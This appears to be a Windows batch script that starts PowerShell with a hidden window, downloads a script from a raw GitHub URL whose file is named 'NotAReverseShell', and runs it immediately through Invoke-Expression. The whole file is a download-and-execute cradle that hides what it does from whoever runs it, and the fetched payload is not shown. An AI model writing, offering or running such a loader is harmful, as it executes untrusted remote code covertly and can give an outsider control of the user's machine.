@echo off
powershell -WindowStyle Hidden -Command "& { (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/sLill/TheGooseIsLoose/refs/heads/main/Scripts/NotAReverseShell') | Invoke-Expression }"
